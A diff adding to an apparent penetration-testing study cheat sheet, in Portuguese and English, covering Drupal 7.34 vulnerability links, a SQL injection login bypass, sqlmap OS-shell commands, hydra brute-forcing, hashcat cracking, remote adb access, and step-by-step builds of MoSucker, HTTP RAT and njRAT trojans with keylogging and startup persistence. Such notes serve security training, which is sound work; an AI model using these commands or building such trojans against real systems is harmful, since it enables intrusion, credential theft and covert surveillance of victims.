@@ -30,6 +30,20 @@ https://academy.hackthebox.com/module/113/section/1089
 COURSE ATTACKING ENTERPRISE NETWORKS
 https://academy.hackthebox.com/module/163/section/1544
 
+## DRUPAL
+
+CMS Drupal v7.34
+http://ftp.drupal.org/files/projects/drupal-7.34.tar.gz
+https://www.drupal.org/blog/drupal-734-and-634-released
+https://www.tenable.com/plugins/nessus/79386
+https://www.acunetix.com/vulnerabilities/web/drupal-core-7-x-multiple-vulnerabilities-7-0-7-34/
+https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2015-03-18/drupal-core-moderately-critical
+
+
+Como instalar o drupal
+https://www.drupal.org/docs/7/install
+
+
 ## CMS
 
 
@@ -108,7 +122,7 @@ https://github.com/danielmiessler/SecLists
 Comando: `john SMB-NTLMv2-SSP-10.10.1.11.txt --wordlist /usr/share/wordlists/rockyou.txt`
 
 **Bruteforce em protocolos**
-Command: `hydra -L users.txt -p Password ssh://192.168.200.1`
+Commando: `hydra -L users.txt -p Password ssh://192.168.200.1`
 
 **Bruteforce em campos de login**
 Command: `hydra -v -L users.tt -P pass.txt 192.168.200.1 http-post-form "/diretorio/login.php:login=ÛSER^&senha=^PASS^&Login:incorreto`
@@ -343,6 +357,12 @@ hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
 1 OR ANY TEXT
 ```
 
+**Manual SQL Injection**
+`in login page enter blah' or 1=1-- as username and click login without entering the password`
+
+**GET access of OS Shell =**
+`sqlmap -u 'url' --dbms=mysql --os-shell SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell`
+
 sudo sqlmap --update
 sqlmap -u "------/id=1" --dbs --batch
 sqlmap -u "https://bliss-hotel.000webhostapp.com/room_details.php?room_type_id=RM101" --dbs --batch
@@ -374,11 +394,17 @@ sqlmap -u “http://www.demosql.com/viewprofile.aspx?id=1” --cookie=<”cookie
 ## Sniffing
 
 **Wireshark Filters**
+
 http.request.method == POST
+
 tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0
+
 ip.dst==192.168.188
+
 ip.src == 192.168.161.100 && tcp.port == 443
+
 http.request.method == "POST"
+
 ip.src == 145.254.160.237 && ip.dst == 145.253.2.203
 
 
@@ -418,7 +444,33 @@ Comando: `snow.exe -C -p magic arquivo.txt`
 **Tirando hash pelo PowerShell**
 Comando: `certutil -hashfile arquivo.txt`
 
+**Gerando hash com Get-FileHash**
+Comando: `Get-FileHash <Location> -A SHA256 (SHA-1/256/384/512/MD5)`
+
+**Verificando se um arquivo possui determinada hash e realiza a comparação**
+ - Retornará verdadeiro ou falso
+Comando: `(Get-FileHash <Location> -A SHA256 ).hash -eq "<hash value>"`
+
+
 **hashcalc** - App utilizado para tirar hashs.
+
+
+**HASHCAT syntax**
+
+
+Comando: `sudo hashcat -a 0 -m 0 Desktop/h1.txt /usr/share/wordlists/rockyou_fix.txt`
+
+-a 0 is for wordlist
+-a 3 is for brut-force
+
+- 0 md5
+- 100 SHA1
+- 1400 SHA256
+- 1700 SHA512
+- 900 MD4
+- 3200 BCRYPT  
+
+For more reference :- [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 ## Cryptography
 
@@ -428,9 +480,10 @@ Openstego - Imagens
 https://github.com/syvaidya/openstego/releases
 
 
-
 ### Indentificando Hashes
+
 Comando: `Hash-identifier`
+
 Comando: `hashid`
 
 **Quebrando hashes**
@@ -438,20 +491,28 @@ sudo hashcat -a 0 -m 0 Desktop/h1.txt /usr/share/wordlists/rockyou_fix.txt
 
 
 **LM**
+
 john --format=LM lm_hashes.txt
+
 john --show lm_hashes.txt
 
 hashcat -m 3000 lm_hashes.txt /path/to/wordlist.txt
+
 hashcat -m 3000 --show lm_hashes.txt
 
 
 **Linux**
+
 md5sum arquivo
+
 cat arquivo | md5sum
 
 ### Veracrypt
 
-
+VeraCrypt
+- select volume
+- mount the volume
+- dismount the volume
 
 ## ANDROID
 
@@ -465,6 +526,43 @@ nmap ip -sV -p 5555
 apt update
 apt install adb
 adb tcpip 5555
-adb connect <ip-address>:5555
+`adb connect <ip-address>:5555`
 adb shell
 
+## RAT Tool
+
+### MOSUCKER
+
+- go to file mosuker
+- click createserver.exe -> run as admin
+- server creator -> click Ok
+- save Server.exe -> save
+- will generate server
+- change victim name -> victim CONNECTION PORT -> 4288
+- keylogger -> enable off-line keylogger ->save
+- exit
+- Open mosucker
+- connect
+- screen capture - start
+
+
+### HTTP RAT Tool
+
+- open Http Rat tool
+- uncheck notification to the mail option
+- set server port number : 84
+- create
+- server will created in http rat tool folder -> http rat trojan
+- when victim runs that, got pwned
+- attacker can access files with browser with ip if of victims
+
+
+###  njRAT Tool
+
+- open njRat v0.7.exe
+- check port no : 5552
+- click start
+- click on Builder
+- enter host ip ( attacker ip)
+- check checkBox - Copy To startup & Registry startup
+- click build
